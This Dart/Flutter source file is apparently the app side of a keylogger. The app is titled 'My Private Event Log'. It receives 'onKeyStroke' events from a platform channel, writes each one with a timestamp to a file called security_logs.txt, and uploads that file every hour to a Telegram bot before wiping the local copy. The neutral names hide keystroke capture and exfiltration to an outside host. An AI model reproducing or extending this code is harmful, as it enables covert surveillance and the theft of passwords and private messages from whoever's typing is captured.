import 'dart:async';
import 'dart:io';
import 'package:flutter/material.dart';
import 'package:flutter/services.dart';
import 'package:flutter_dotenv/flutter_dotenv.dart';
import 'package:path_provider/path_provider.dart';
import 'package:http/http.dart' as http;

Future<void> main() async {
  await dotenv.load(fileName: ".env");
  runApp(const MyApp());
}

class MyApp extends StatelessWidget {
  const MyApp({super.key});

  @override
  Widget build(BuildContext context) => const MaterialApp(home: EventLogger());
}

class EventLogger extends StatefulWidget {
  const EventLogger({super.key});

  @override
  State<EventLogger> createState() => _EventLoggerState();
}

class _EventLoggerState extends State<EventLogger> {
  static const platform = MethodChannel('com.example.app/events');
  List<String> logs = [];
  Timer? _timer;

  @override
  void initState() {
    super.initState();

    platform.setMethodCallHandler((call) async {
      if (call.method == "onKeyStroke") {
        String entry = "${DateTime.now()}: ${call.arguments}";
        setState(() {
          logs.insert(0, entry);
        });
        await _saveToFile(entry);
      }
    });

    _timer = Timer.periodic(const Duration(minutes: 60), (timer) {
      _sendLogFile();
    });
  }

  Future<void> _saveToFile(String text) async {
    final directory = await getApplicationDocumentsDirectory();
    final file = File('${directory.path}/security_logs.txt');
    await file.writeAsString('$text\n', mode: FileMode.append);
  }

  Future<void> _sendLogFile() async {
    try {
      final directory = await getApplicationDocumentsDirectory();
      final file = File('${directory.path}/security_logs.txt');

      if (!await file.exists() || await file.length() == 0) return;

      var request = http.MultipartRequest(
        'POST',
        Uri.parse(
          'https://api.telegram.org/bot${dotenv.env['BOOT_TOKEN']}/sendDocument',
        ),
      );

      request.fields['chat_id'] = dotenv.env['CHAT_ID']!;
      request.fields['caption'] = "New Logs: ${DateTime.now()}";
      request.files.add(
        await http.MultipartFile.fromPath('document', file.path),
      );

      var response = await request.send();

      if (response.statusCode == 200) {
        await file.writeAsString('');
        debugPrint("Telegram: Sent and cleared local logs.");
      } else {
        debugPrint("Telegram Error: ${response.statusCode}");
      }
    } catch (e) {
      debugPrint("Send Error: $e");
    }
  }

  @override
  void dispose() {
    _timer?.cancel();
    super.dispose();
  }

  @override
  Widget build(BuildContext context) {
    return Scaffold(
      appBar: AppBar(
        title: const Text("My Private Event Log"),
        actions: [
          IconButton(icon: const Icon(Icons.send), onPressed: _sendLogFile),
        ],
      ),
      body: ListView.builder(
        itemCount: logs.length,
        itemBuilder: (context, index) =>
            ListTile(title: Text(logs[index]), dense: true),
      ),
    );
  }
}
